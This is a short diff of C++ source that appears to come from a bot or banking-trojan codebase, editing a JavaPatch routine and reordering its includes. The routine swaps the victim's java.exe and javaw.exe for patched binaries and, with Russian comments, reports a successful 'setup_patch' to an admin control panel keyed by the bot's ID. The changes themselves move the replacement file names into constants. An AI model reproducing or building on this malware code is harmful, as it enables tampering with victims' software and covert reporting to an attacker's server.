@@ -2,14 +2,14 @@
 #include "Modules.h"
 
 //#ifdef JAVS_PATCHERH
-
+//----------------------------------------------------------------------------
+#include "java_patcher.h"
 #include "BotHttp.h"
 #include "Config.h"
 #include "Memory.h"
 #include "Strings.h"
 #include "GetApi.h"
 #include "Shlobj.h"
-#include "java_patcher.h"
 #include "ntdll.h"
 #include "Utils.h"
 #include "Modules.h"
@@ -974,8 +974,8 @@ DWORD WINAPI JavaPatch( LPVOID lpData )
 				res = FALSE;		
 			}
 			//Подменяем яву
-			if( ReplacementExe( "java.exe", "javao.exe", javaExe.str() ) )
-				if( ReplacementExe( "javaw.exe", "javawo.exe", javaExew.str() ) )
+			if( ReplacementExe( "java.exe", Patched_Jawa_Name, javaExe.str() ) )
+				if( ReplacementExe( "javaw.exe", Patched_JawaW_Name, javaExew.str() ) )
 				{
 					//сообщаем админке, что ява патч установлен
 					SendLogToAdmin( adminUrl, botUid, "setup_patch", "1" );
@@ -1125,4 +1125,6 @@ void  JavaPatcherSignal()
 	}
 }
 
+
+//----------------------------------------------------------------------------
 //#endif
